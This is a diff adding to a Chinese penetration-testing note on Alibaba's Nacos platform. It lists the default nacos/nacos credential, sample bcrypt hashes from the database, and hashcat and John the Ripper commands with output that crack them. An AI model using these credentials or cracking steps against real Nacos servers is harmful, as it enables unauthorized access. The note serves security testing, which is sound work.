@@ -6,12 +6,50 @@
 
 Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。
 
-## 二、默认口令登录
+## 二、默认口令/弱口令
 
 Nacos 默认帐户名密码：
 
 ```
 nacos/nacos
+```
+
+数据库中的 bcrypt 加密存储示例：
+
+```shell
+# nacos
+$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu
+
+# Hello123
+$2a$10$rT.ZmZTjj55Xs65yR9ZDdexuLITXfCXkifQv4KpLm7yVLtiBmUHgG
+```
+
+弱口令爆破 with hashcat：
+
+```shell
+# nacos
+echo -n '$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu' > hashes.txt
+-----
+hashcat -m 3200 -a 0 -o result.txt hashes.txt ~/HackTools/Dict/YOUR_DICT.txt --force
+-----
+cat result.txt
+$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu:nacos
+
+# Hello123
+echo -n '$2a$10$rT.ZmZTjj55Xs65yR9ZDdexuLITXfCXkifQv4KpLm7yVLtiBmUHgG' > hashes.txt
+hashcat -m 3200 -a 0 -o result.txt hashes.txt ~/HackTools/Dict/YOUR_DICT.txt --force
+-----
+cat result.txt
+$2a$10$rT.ZmZTjj55Xs65yR9ZDdexuLITXfCXkifQv4KpLm7yVLtiBmUHgG:Hello123
+```
+
+弱口令爆破 with john the ripper：
+
+```shell
+john --wordlist=~/HackTools/Dict/YOUR_DICT.txt hashes.txt
+-----
+john --show hashes.txt
+?:Hello123
 ```
 
 ## 三、可能存在的未授权 API
